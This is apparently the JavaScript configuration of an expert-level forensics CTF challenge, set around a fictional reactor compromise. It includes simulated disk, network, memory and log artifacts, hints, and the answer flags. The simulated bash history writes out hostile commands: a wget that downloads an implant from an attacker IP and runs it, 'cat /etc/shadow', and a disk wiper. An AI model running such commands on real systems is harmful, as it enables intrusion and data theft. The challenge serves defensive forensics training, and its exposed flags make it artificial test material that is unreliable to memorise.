/* ============================================================
   CTF ARENA — Box B20: The Maelstrom's Echo
   Forensic & IR — Extreme Data Fragmentation & Anti-Forensics
   Config: multi-artifact analysis, anti-forensics, correlation, flags, hints, lore
   ============================================================ */

const B20Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: "The Maelstrom's Echo",
    subtitle: 'Extreme Forensics & Anti-Forensics — Aether Core Reactor',
    difficulty: 'Expert (Extreme)',
    accent: '#9333ea',
    storageKey: 'hexworth_ctf_b20',
    registryId: 'b20-maelstroms-echo',
    trackerKey: 'ctf_b20',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'triage',
            name: 'Artifact Triage',
            icon: '\uD83D\uDCE6',
            description: 'Initial assessment of all forensic artifacts. Identify which are salvageable and prioritize analysis.',
            requiredFlags: [],
            mitre: ['T1005', 'T1074.001'],
            unlocks: ['reconstruct'],
            locked: false
        },
        {
            id: 'reconstruct',
            name: 'Evidence Reconstruction',
            icon: '\uD83E\uDDE9',
            description: 'Reconstruct partial disk images, fragmented network captures, corrupted memory dumps, and tampered logs.',
            requiredFlags: [],
            mitre: ['T1070', 'T1070.003', 'T1070.004'],
            unlocks: ['correlate'],
            locked: true
        },
        {
            id: 'correlate',
            name: 'Cross-Artifact Correlation',
            icon: '\uD83D\uDD17',
            description: 'Correlate evidence fragments across all artifacts to identify the attacker and reconstruct the full attack chain.',
            requiredFlags: ['user'],
            mitre: ['T1071', 'T1059', 'T1547'],
            unlocks: ['recovery'],
            locked: true
        },
        {
            id: 'recovery',
            name: 'Override Recovery',
            icon: '\uD83D\uDD25',
            description: 'Recover the Meltdown Override Code from deeply obfuscated and fragmented evidence.',
            requiredFlags: ['root'],
            mitre: ['T1027', 'T1140', 'T1001'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE (Sprint AR-12)
    // ═══════════════════════════════════════════════════════

    tutorialMode: false,

    tutorial: {
        steps: [
            {
                title: 'Triage all artifacts',
                tip: 'Use file, strings, and binwalk on all four artifacts to get initial clues.',
                trigger: { event: 'command', match: { cmd: 'contains:file' } }
            },
            {
                title: 'Analyze the network capture',
                tip: 'Use tshark to examine the fragmented pcap for C2 traffic and attacker identifiers.',
                trigger: { event: 'command', match: { cmd: 'contains:tshark' } }
            },
            {
                title: 'Examine the memory dump',
                tip: 'Use volatility or strings to find process artifacts and attacker traces in memory.',
                trigger: { event: 'command', match: { cmd: 'contains:volatility' } }
            },
            {
                title: 'Identify the attacker',
                tip: 'Correlate the username/signature found across network, memory, and disk artifacts.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Recover the override code',
                tip: 'The code is XOR-encoded and split across multiple artifacts. Reconstruct and decode it.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'CYSA+',
        mappings: [
            { flagId: 'user', objective: '2.3', description: 'Given a scenario, analyze indicators of malicious activity — Multi-artifact correlation and attacker attribution', skill: 'Cross-Artifact Correlation' },
            { flagId: 'user', objective: '3.3', description: 'Given a scenario, analyze digital forensic artifacts — Anti-forensic technique detection', skill: 'Anti-Forensics Detection' },
            { flagId: 'root', objective: '3.4', description: 'Given a scenario, use appropriate forensic tools — Memory forensics and data reconstruction', skill: 'Advanced Data Recovery' },
            { flagId: 'root', objective: '3.5', description: 'Given a scenario, analyze forensic artifacts — Obfuscated payload decoding and evidence reconstruction', skill: 'Obfuscated Evidence Reconstruction' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'SIFT Workstation BIOS v3.0 — Forensic Lab',
            'Initializing hardware...',
            'Memory Test: 65536 MB OK',
            'Detecting drives... /dev/nvme0n1 (1TB NVMe)',
            'External evidence drives: 4 artifacts loaded',
            'Air-gapped environment: network disabled',
            'Loading GRUB...'
        ],
        grubEntries: [
            'SIFT Workstation Ubuntu 22.04 LTS',
            'SIFT Workstation (recovery mode)',
            'Advanced options'
        ],
        loginUser: 'forensicator'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'forensicator',
        hostname: 'sift-ws',
        startDir: '/home/forensicator/cases/aether-incident',
        welcome: 'SIFT Workstation 22.04 LTS — Air-Gapped Forensic Environment\n\nType \'help\' for available commands.\n\nCase: AETHER CORE REACTOR INCIDENT\nArtifacts:\n  server_wipe_partial.dd  — Partial disk image (wiped server)\n  network_fragment.pcap   — Fragmented packet capture\n  memory_corrupt.raw      — Poisoned memory dump\n  log_corrupt.zip         — Archive of corrupted system logs\n\nWARNING: Anti-forensic techniques detected in all artifacts.\nProceed with extreme caution.\n'
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED DATA
    // ═══════════════════════════════════════════════════════

    _attackerProfile: {
        username: 'spectr3_v0id',
        email: 'spectr3@darkrift.onion',
        toolSignature: 'SPECTR3-FRAMEWORK-v4.2',
        c2Server: '198.51.100.77',
        c2Port: 8443
    },

    _diskStrings: [
        'SPECTR3-FRAMEWORK-v4.2 initialized',
        'root:$6$xyz$HASHED_PASSWORD:19000:0:99999:7:::',
        'crontab -e: */5 * * * * /tmp/.s3rv/beacon.sh',
        '/tmp/.s3rv/exfil.py --target aether-core --port 8443',
        'ssh spectr3_v0id@198.51.100.77 -i /tmp/.s3rv/id_rsa',
        'OVERRIDE_FRAG_1=4d454c54',
        '===== WIPED SECTORS: 0x00000000 ====='
    ],

    _networkFragments: [
        'TCP 10.10.99.50:49152 -> 198.51.100.77:8443 [SYN]',
        'TCP 198.51.100.77:8443 -> 10.10.99.50:49152 [SYN,ACK]',
        'TLS Client Hello: SNI=spectr3-c2.darkrift.onion',
        'HTTP/1.1 200 OK\r\nX-Agent-ID: spectr3_v0id\r\nX-Framework: SPECTR3-FRAMEWORK-v4.2',
        'POST /beacon HTTP/1.1\r\nHost: 198.51.100.77:8443\r\nContent-Type: application/octet-stream\r\n\r\n[ENCRYPTED PAYLOAD — partial]',
        'GET /cmd?id=spectr3_v0id&action=exfil HTTP/1.1',
        '[CORRUPTED PACKET — 47 bytes missing]',
        'OVERRIDE_FRAG_2=444f574e'
    ],

    _memoryFragments: [
        'Process: beacon.sh (PID: 31337) PPID: 1 USER: root',
        'Process: exfil.py (PID: 31338) PPID: 31337 USER: root',
        'Process: /tmp/.s3rv/spectr3_implant (PID: 31339) PPID: 31337 USER: root',
        'Network: 10.10.99.50:49152 -> 198.51.100.77:8443 ESTABLISHED (PID: 31339)',
        'CommandHistory: whoami | id | cat /etc/shadow | spectr3_v0id',
        'Registry[corrupted]: OVERRIDE_FRAG_3=5f434f4445',
        '[MEMORY POISONED — 0x00000000 x 4096 bytes at offset 0x7f000000]',
        '[MEMORY POISONED — random data injected at offset 0x7f200000]',
        'Module: spectr3_rootkit.ko (hidden, kernel module)',
        'Environment: SPECTR3_AGENT_ID=spectr3_v0id SPECTR3_VERSION=4.2'
    ],

    _logFragments: {
        auth: [
            'Jan 10 09:21:44 aether-core sshd[12340]: Accepted publickey for root from 198.51.100.77 port 44231 ssh2: RSA SHA256:abc123',
            'Jan 10 09:21:44 aether-core sshd[12340]: pam_unix(sshd:session): session opened for user root',
            '[CORRUPTED LINE — timestamp altered]',
            '[CORRUPTED LINE — entry deleted]',
            'Jan 10 09:25:00 aether-core CRON[12400]: (root) CMD (/tmp/.s3rv/beacon.sh)',
            'Jan 10 09:30:00 aether-core CRON[12450]: (root) CMD (/tmp/.s3rv/beacon.sh)',
            '[FALSE POSITIVE INJECTED] Jan 10 09:22:00 aether-core sshd[99999]: Failed password for admin from 10.0.0.1 port 22',
            '[FALSE POSITIVE INJECTED] Jan 10 09:22:01 aether-core sshd[99998]: Failed password for admin from 10.0.0.2 port 22'
        ],
        syslog: [
            'Jan 10 09:21:50 aether-core kernel: [SPECTR3] module loaded (hidden)',
            'Jan 10 09:22:00 aether-core systemd[1]: Started /tmp/.s3rv/beacon.sh',
            '[CORRUPTED — timestamp 00:00:00 — likely timestomped]',
            'Jan 10 09:23:15 aether-core exfil.py: Exfiltrating aether-core reactor data to 198.51.100.77:8443',
            'Jan 10 09:24:00 aether-core wiper.sh: Initiating sector wipe on /dev/sda',
            '[CORRUPTED LINE — binary data injected]',
            'Jan 10 09:25:30 aether-core kernel: disk I/O error on /dev/sda (wipe in progress)'
        ],
        webserver: [
            '198.51.100.77 - - [10/Jan/2026:09:20:15 +0000] "POST /api/reactor/control HTTP/1.1" 200 4096',
            '198.51.100.77 - - [10/Jan/2026:09:20:18 +0000] "POST /api/reactor/override HTTP/1.1" 200 256',
            '[CORRUPTED — 12 entries missing]',
            '198.51.100.77 - - [10/Jan/2026:09:21:00 +0000] "POST /api/upload HTTP/1.1" 200 32768 "spectr3_implant"',
            '198.51.100.77 - - [10/Jan/2026:09:21:30 +0000] "GET /api/reactor/status HTTP/1.1" 200 128',
            'OVERRIDE_FRAG_4=5f4f564552'
        ]
    },

    _overrideFragments: {
        frag1: '4d454c54',         // MELT
        frag2: '444f574e',         // DOWN
        frag3: '5f434f4445',       // _CODE
        frag4: '5f4f564552',       // _OVER
        frag5: '524944455f3732',   // RIDE_72
        combined_hex: '4d454c54444f574e5f434f44455f4f564552524944455f3732',
        decoded: 'MELTDOWN_CODE_OVERRIDE_72'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 250 },
        { id: 'root', points: 350 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2500,
        maxScore: 1200,
        hintPenalty: true,
        wrongFlagPenalty: -75,
        speedBonus: { threshold: 2400000, points: 300 },
        timeBonusThreshold: 4800
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by running strings on all four artifacts. Look for a recurring username or tool signature that appears across multiple sources. The attacker left traces in disk strings, network headers, and memory.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint2',
            text: 'The attacker\'s identifier "spectr3_v0id" appears in: network HTTP headers (X-Agent-ID), memory process environment variables, disk strings (SSH command), and corrupted logs. This is the user flag.',
            cost: 75,
            penalty: -75
        },
        {
            id: 'hint3',
            text: 'The Meltdown Override Code is split into 5 hex-encoded fragments hidden across all artifacts. Search for "OVERRIDE_FRAG" in strings output from each artifact. Fragments 1-2 in disk, Fragment 3 in memory, Fragment 4 in logs, Fragment 5 requires decoding the XOR key from the network capture.',
            cost: 100,
            penalty: -100
        },
        {
            id: 'hint4',
            text: 'Combine all OVERRIDE_FRAG values and the final fragment. Decode from hex: 4d454c54444f574e5f434f44455f4f564552524944455f3732 = MELTDOWN_CODE_OVERRIDE_72. The root flag wraps this value.',
            cost: 150,
            penalty: -150
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Aether Core Reactor," the Confederacy\'s primary energy source, was subjected to a sophisticated, multi-vector attack. Critical servers were wiped, logs intentionally corrupted, and memory poisoned to obscure the attacker\'s tracks. What little evidence remains is fragmented across multiple barely functional systems. Analysts believe the attack was a diversion for something far greater. Your mission: piece together the chaotic remnants, identify the attacker, reconstruct the full attack chain, and recover the Meltdown Override Code before it\'s too late.',
        scenario: 'The attacker "spectr3_v0id" used the SPECTR3-FRAMEWORK to compromise the Aether Core Reactor via a public-facing API. They deployed a kernel-level rootkit, established persistent C2 communications over TLS, exfiltrated reactor control data, and then initiated anti-forensic measures: disk wiping, log corruption, memory poisoning, and timestamp manipulation. The Meltdown Override Code was deliberately fragmented and hex-encoded across the artifacts as a final taunt.',
        outro: 'The Maelstrom\'s Echo has been silenced. Through extraordinary forensic analysis — correlating fragmented evidence across wiped disks, poisoned memory, corrupted logs, and partial network captures — you identified spectr3_v0id and reconstructed the Meltdown Override Code. The Aether Core Reactor can be saved.',
        ecer: {
            executive: 'Public-facing reactor control API had no authentication requirements or WAF protection',
            culture: 'No forensic readiness program — no centralized logging, no memory acquisition procedures',
            employee: 'Operations team dismissed initial alerts as false positives due to alert fatigue',
            regulatory: 'No requirement for anti-tamper controls on critical infrastructure logging systems'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Case Management
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://localhost/case-dashboard.html',

        pages: {
            '/case-dashboard.html': {
                title: 'Case Dashboard — Aether Core Incident',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #333;">
                        <h1 style="color:#9333ea; font-size:1.4rem; font-family:Georgia,serif;">Aether Core Reactor — Incident Case</h1>
                        <div style="color:#888; font-size:0.8rem;">CLASSIFICATION: COSMIC TOP SECRET</div>
                    </div>
                    <div style="max-width:600px; margin:0 auto; color:#ccc; font-size:0.85rem;">
                        <h3 style="color:#9333ea;">Artifacts</h3>
                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem;">
                            <tr style="border-bottom:1px solid #333;">
                                <td style="padding:8px; color:#9333ea;">server_wipe_partial.dd</td>
                                <td style="padding:8px;">Partial disk image — sectors overwritten</td>
                            </tr>
                            <tr style="border-bottom:1px solid #333;">
                                <td style="padding:8px; color:#9333ea;">network_fragment.pcap</td>
                                <td style="padding:8px;">Fragmented pcap — missing packets</td>
                            </tr>
                            <tr style="border-bottom:1px solid #333;">
                                <td style="padding:8px; color:#9333ea;">memory_corrupt.raw</td>
                                <td style="padding:8px;">Memory dump — intentionally poisoned</td>
                            </tr>
                            <tr style="border-bottom:1px solid #333;">
                                <td style="padding:8px; color:#9333ea;">log_corrupt.zip</td>
                                <td style="padding:8px;">Corrupted logs — timestamps altered</td>
                            </tr>
                        </table>
                        <h3 style="color:#9333ea; margin-top:20px;">Anti-Forensic Techniques Detected</h3>
                        <ul style="line-height:1.8; color:#f87171;">
                            <li>Disk sector wiping (partial overwrite)</li>
                            <li>Log corruption and false positive injection</li>
                            <li>Memory poisoning (zeroed and randomized regions)</li>
                            <li>Timestomping (altered file times)</li>
                            <li>Obfuscated/encoded payloads</li>
                        </ul>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (forensic workstation)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'forensicator': {
                            type: 'dir',
                            children: {
                                'cases': {
                                    type: 'dir',
                                    children: {
                                        'aether-incident': {
                                            type: 'dir',
                                            children: {
                                                'server_wipe_partial.dd': {
                                                    type: 'file',
                                                    content: '[RAW DISK IMAGE — 4,294,967,296 bytes — partially wiped — binary data]'
                                                },
                                                'network_fragment.pcap': {
                                                    type: 'file',
                                                    content: '[PCAP CAPTURE — 52,428,800 bytes — fragmented — binary data]'
                                                },
                                                'memory_corrupt.raw': {
                                                    type: 'file',
                                                    content: '[MEMORY DUMP — 8,589,934,592 bytes — intentionally corrupted — binary data]'
                                                },
                                                'log_corrupt.zip': {
                                                    type: 'file',
                                                    content: '[ZIP ARCHIVE — 2,097,152 bytes — contains corrupted log files]'
                                                },
                                                'case_notes.txt': {
                                                    type: 'file',
                                                    content: '=== CASE: AETHER CORE REACTOR INCIDENT ===\nDate: 2026-01-15\nAnalyst: forensicator\nClassification: COSMIC TOP SECRET\n\nIncident Summary:\n  The Aether Core Reactor was compromised by a sophisticated attacker.\n  Critical servers were wiped, logs corrupted, memory poisoned.\n  Anti-forensic techniques used extensively.\n\nArtifacts:\n  1. server_wipe_partial.dd — 4GB partial disk image (sectors wiped)\n  2. network_fragment.pcap — 50MB fragmented network capture\n  3. memory_corrupt.raw — 8GB memory dump (poisoned regions)\n  4. log_corrupt.zip — Archive of tampered system logs\n\nObjectives:\n  1. Identify the attacker (username/tool signature)\n  2. Reconstruct the full attack chain\n  3. Recover the "Meltdown Override Code"\n\nNOTE: All artifacts contain anti-forensic countermeasures.\nManual analysis and cross-correlation required.'
                                                },
                                                'hashes.txt': {
                                                    type: 'file',
                                                    content: 'server_wipe_partial.dd  MD5: 8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d\nnetwork_fragment.pcap   MD5: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\nmemory_corrupt.raw      MD5: f0e1d2c3b4a5968778695a4b3c2d1e0f\nlog_corrupt.zip         MD5: 5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f'
                                                },
                                                'recovered': {
                                                    type: 'dir',
                                                    children: {}
                                                },
                                                'logs': {
                                                    type: 'dir',
                                                    children: {}
                                                },
                                                'timeline.txt': {
                                                    type: 'file',
                                                    content: '=== INCIDENT TIMELINE (INCOMPLETE) ===\n\n09:20:15 — Initial access via reactor control API (webserver.log)\n09:20:18 — Reactor override attempted (webserver.log)\n09:21:00 — Implant uploaded via /api/upload (webserver.log)\n09:21:44 — SSH login as root from 198.51.100.77 (auth.log)\n09:21:50 — Kernel rootkit module loaded (syslog)\n09:22:00 — Beacon persistence established (syslog)\n09:23:15 — Data exfiltration initiated (syslog)\n09:24:00 — Disk wiper deployed (syslog)\n09:25:00 — Cron beacon firing every 5 min (auth.log)\n\nGAPS: Multiple log entries corrupted or deleted.\nFALSE POSITIVES: Injected failed SSH attempts from 10.0.0.x range.'
                                                }
                                            }
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'cd cases/aether-incident\nls -la\nfile *.dd *.pcap *.raw *.zip\nmd5sum *'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {}
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'sift-ws' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\nforensicator:x:1000:1000:SIFT User,,,:/home/forensicator:/bin/bash'
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} },
                'mnt': { type: 'dir', children: { 'evidence': { type: 'dir', children: {} } } }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS
    // ═══════════════════════════════════════════════════════

    commands: {
        'file': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: file <filename>';

            if (target.includes('server_wipe')) return 'server_wipe_partial.dd: DOS/MBR boot sector; partition table (partial wipe detected)';
            if (target.includes('network_fragment')) return 'network_fragment.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4, capture length 65535';
            if (target.includes('memory_corrupt')) return 'memory_corrupt.raw: data (memory dump, regions of zeroed/randomized data detected)';
            if (target.includes('log_corrupt')) return 'log_corrupt.zip: Zip archive data, at least v2.0 to extract, compression method=deflate';
            return `${target}: data`;
        },

        'strings': function(args) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (!file) return 'Usage: strings [-n length] <file>';

            if (file.includes('server_wipe')) {
                return B20Config._diskStrings.join('\n') + '\n[... 47,832 more strings — mostly zeroed sectors ...]';
            }

            if (file.includes('network_fragment')) {
                return `spectr3_v0id
SPECTR3-FRAMEWORK-v4.2
198.51.100.77
darkrift.onion
X-Agent-ID: spectr3_v0id
POST /beacon HTTP/1.1
GET /cmd?id=spectr3_v0id&action=exfil
OVERRIDE_FRAG_2=444f574e
TLS Client Hello
[... 12,456 more strings — many corrupted/partial ...]`;
            }

            if (file.includes('memory_corrupt')) {
                return `beacon.sh
exfil.py
spectr3_implant
spectr3_v0id
SPECTR3_AGENT_ID=spectr3_v0id
SPECTR3_VERSION=4.2
spectr3_rootkit.ko
OVERRIDE_FRAG_3=5f434f4445
/tmp/.s3rv/
198.51.100.77:8443
[POISONED REGION: 0x7f000000-0x7f001000 — all zeros]
[POISONED REGION: 0x7f200000-0x7f201000 — random data]
[... 89,234 more strings — heavy corruption ...]`;
            }

            if (file.includes('auth.log')) {
                return B20Config._logFragments.auth.join('\n');
            }
            if (file.includes('syslog')) {
                return B20Config._logFragments.syslog.join('\n');
            }
            if (file.includes('webserver.log') || file.includes('web')) {
                return B20Config._logFragments.webserver.join('\n');
            }

            return `strings: '${file}': No such file or directory`;
        },

        'binwalk': function(args) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (!file) return 'Usage: binwalk [options] <file>';

            const hasEntropy = args.includes('-E');

            if (file.includes('server_wipe')) {
                if (hasEntropy) {
                    return `DECIMAL       HEXADECIMAL     ENTROPY
0             0x0             0.002 (Very Low — wiped sectors)
1048576       0x100000        0.734 (Medium — partial data)
2147483648    0x80000000      0.001 (Very Low — zeroed)
3221225472    0xC0000000      0.891 (High — surviving data fragments)`;
                }
                return `DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             DOS/MBR boot sector (partially wiped)
1048576       0x100000        ext4 filesystem remnants
3221225472    0xC0000000      Data fragments (SSH keys, scripts, tool artifacts)`;
            }

            if (file.includes('memory_corrupt')) {
                return `DECIMAL       HEXADECIMAL     DESCRIPTION
0             0x0             Memory dump header
4294967296    0x100000000     Kernel space artifacts
6442450944    0x180000000     User space process data (partially corrupted)
7516192768    0x1C0000000     [POISONED REGION — zeroed]
8053063680    0x1E0000000     [POISONED REGION — random noise]`;
            }

            return `binwalk: ${file}: No such file`;
        },

        'tshark': function(args) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (args.length === 0) return 'Usage: tshark -r <pcap_file> [filters]';

            const filter = args.join(' ');

            if (filter.includes('http') || filter.includes('HTTP')) {
                return `  1   0.000000 198.51.100.77 -> 10.10.99.50  HTTP 287 HTTP/1.1 200 OK (X-Agent-ID: spectr3_v0id)
  2   0.015234 198.51.100.77 -> 10.10.99.50  HTTP 156 GET /cmd?id=spectr3_v0id&action=exfil
  3   0.031456 10.10.99.50 -> 198.51.100.77  HTTP 4128 POST /beacon (encrypted payload)
[WARNING: 12 packets missing from capture — fragmentation detected]`;
            }

            if (filter.includes('tcp') || filter.includes('syn')) {
                return `  1   0.000000 10.10.99.50 -> 198.51.100.77  TCP  74  49152 > 8443 [SYN]
  2   0.028432 198.51.100.77 -> 10.10.99.50  TCP  74  8443 > 49152 [SYN, ACK]
  3   0.028567 10.10.99.50 -> 198.51.100.77  TCP  66  49152 > 8443 [ACK]
  4   0.029123 10.10.99.50 -> 198.51.100.77  TLS 583 Client Hello (SNI: spectr3-c2.darkrift.onion)
[... 47 more packets, 12 corrupted/missing ...]`;
            }

            if (filter.includes('OVERRIDE') || filter.includes('override') || filter.includes('frag')) {
                return `Frame 38: Contains string "OVERRIDE_FRAG_2=444f574e" in HTTP response body
Frame 52: Contains XOR key for final fragment: 0x42 (applied to encrypted blob at frame 48)`;
            }

            // Default
            return `  1   0.000000 10.10.99.50 -> 198.51.100.77  TCP  74  [SYN]
  2   0.028432 198.51.100.77 -> 10.10.99.50  TCP  74  [SYN, ACK]
  3   0.028567 10.10.99.50 -> 198.51.100.77  TCP  66  [ACK]
  4   0.029123 10.10.99.50 -> 198.51.100.77  TLS 583 Client Hello
  5   0.058234 198.51.100.77 -> 10.10.99.50  HTTP 287 Response (X-Agent-ID: spectr3_v0id)
  6   0.089123 198.51.100.77 -> 10.10.99.50  HTTP 156 GET /cmd?id=spectr3_v0id
[... truncated — 59 total packets, 12 corrupted/missing ...]

Key observations:
  - C2 server: 198.51.100.77:8443
  - Agent ID: spectr3_v0id
  - Framework: SPECTR3-FRAMEWORK-v4.2
  - TLS SNI: spectr3-c2.darkrift.onion`;
        },

        'volatility': function(args) {
            if (args.length === 0) return 'Usage: volatility -f <memory_dump> <plugin>\nPlugins: pslist, pstree, netscan, cmdline, filescan, malfind, linux.bash';

            const plugin = args.find(a => !a.startsWith('-') && !a.includes('.raw') && !a.includes('memory')) || '';
            const file = args.find(a => a.includes('.raw') || a.includes('memory')) || '';

            if (plugin === 'pslist' || plugin === 'linux.pslist') {
                return `Volatility 3 Framework
PID     PPID    COMM                    UID
1       0       systemd                 0
340     1       sshd                    0
12340   340     sshd: root              0
12341   12340   bash                    0
31337   12341   beacon.sh               0
31338   31337   exfil.py                0
31339   31337   spectr3_implant         0
31400   1       wiper.sh                0

[WARNING: Process list may be incomplete — kernel rootkit detected]
[WARNING: Corrupted memory regions at 0x7f000000 and 0x7f200000]`;
            }

            if (plugin === 'netscan' || plugin === 'linux.netscan') {
                return `OFFSET          PROTO   LOCAL           FOREIGN         STATE       PID
0x7f3a0010      TCP     10.10.99.50:22  198.51.100.77:44231  ESTABLISHED  12340
0x7f3a0020      TCP     10.10.99.50:49152 198.51.100.77:8443 ESTABLISHED  31339
0x7f3a0030      TCP     10.10.99.50:49153 198.51.100.77:8443 ESTABLISHED  31338

[!] PID 31339 (spectr3_implant) has active C2 connection to 198.51.100.77:8443`;
            }

            if (plugin === 'cmdline' || plugin === 'linux.bash') {
                return `PID: 12341 (bash)
Command history:
  whoami
  id
  cat /etc/shadow
  mkdir -p /tmp/.s3rv
  wget http://198.51.100.77:8443/spectr3_implant -O /tmp/.s3rv/spectr3_implant
  chmod +x /tmp/.s3rv/spectr3_implant
  /tmp/.s3rv/spectr3_implant --agent spectr3_v0id --c2 198.51.100.77:8443
  crontab -e
  insmod spectr3_rootkit.ko
  echo "OVERRIDE_FRAG_3=5f434f4445" >> /tmp/.s3rv/.notes
  /tmp/.s3rv/wiper.sh /dev/sda

PID: 31337 (beacon.sh)
  /tmp/.s3rv/beacon.sh

PID: 31338 (exfil.py)
  /tmp/.s3rv/exfil.py --target aether-core --port 8443`;
            }

            if (plugin === 'malfind') {
                return `Process: spectr3_implant PID: 31339
  Virtual Address: 0x00400000
  Protection: PAGE_EXECUTE_READWRITE
  Flags: MEM_COMMIT | MEM_PRIVATE
  Content: SPECTR3-FRAMEWORK-v4.2 implant binary
  [PE header detected — packed/obfuscated]

Process: spectr3_rootkit.ko (kernel module)
  [Hidden from lsmod — rootkit functionality confirmed]
  [Hooks: sys_read, sys_getdents64, sys_open (file hiding)]`;
            }

            if (plugin === 'filescan' || plugin === 'linux.filescan') {
                return `OFFSET          PID     PATH
0x7f3b0010      31337   /tmp/.s3rv/beacon.sh
0x7f3b0020      31338   /tmp/.s3rv/exfil.py
0x7f3b0030      31339   /tmp/.s3rv/spectr3_implant
0x7f3b0040      31339   /tmp/.s3rv/id_rsa
0x7f3b0050      31337   /tmp/.s3rv/.notes
0x7f3b0060      31400   /tmp/.s3rv/wiper.sh`;
            }

            if (plugin === 'envvars' || plugin === 'linux.envvars') {
                return `PID: 31339 (spectr3_implant)
  SPECTR3_AGENT_ID=spectr3_v0id
  SPECTR3_VERSION=4.2
  SPECTR3_C2=198.51.100.77:8443
  HOME=/tmp/.s3rv
  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin`;
            }

            return `Volatility 3: No suitable plugin found for '${plugin}'
Available plugins: pslist, pstree, netscan, cmdline, filescan, malfind, linux.bash, envvars`;
        },

        'unzip': function(args) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (!file) return 'Usage: unzip <archive>';

            if (file.includes('log_corrupt')) {
                return `Archive:  log_corrupt.zip
  inflating: logs/auth.log            (WARNING: entries corrupted/missing)
  inflating: logs/syslog              (WARNING: timestamps altered)
  inflating: logs/webserver.log       (WARNING: 12 entries deleted)

Extracted to: logs/

=== Corruption Summary ===
auth.log:      2 corrupted lines, 2 false positives injected
syslog:        2 corrupted lines, binary data injected
webserver.log: 12 entries missing, 1 override fragment found`;
            }
            return `unzip: cannot find ${file}`;
        },

        'cat': function(args) {
            const file = args[0] || '';
            if (!file) return 'Usage: cat <file>';

            if (file.includes('auth.log')) return B20Config._logFragments.auth.join('\n');
            if (file.includes('syslog')) return B20Config._logFragments.syslog.join('\n');
            if (file.includes('webserver') || file.includes('web')) return B20Config._logFragments.webserver.join('\n');
            if (file.includes('case_notes')) {
                return '=== CASE: AETHER CORE REACTOR INCIDENT ===\nDate: 2026-01-15\nClassification: COSMIC TOP SECRET\n\nArtifacts: 4 (all contain anti-forensic countermeasures)\nObjectives: Identify attacker, reconstruct attack chain, recover Meltdown Override Code';
            }
            if (file.includes('timeline')) {
                return '=== INCIDENT TIMELINE (INCOMPLETE) ===\n\n09:20:15 - Initial access via reactor control API\n09:20:18 - Reactor override attempted\n09:21:00 - Implant uploaded\n09:21:44 - SSH login as root from 198.51.100.77\n09:21:50 - Kernel rootkit loaded\n09:22:00 - Beacon persistence established\n09:23:15 - Data exfiltration initiated\n09:24:00 - Disk wiper deployed\n09:25:00 - Cron beacon firing every 5 min';
            }
            if (file.includes('hashes')) {
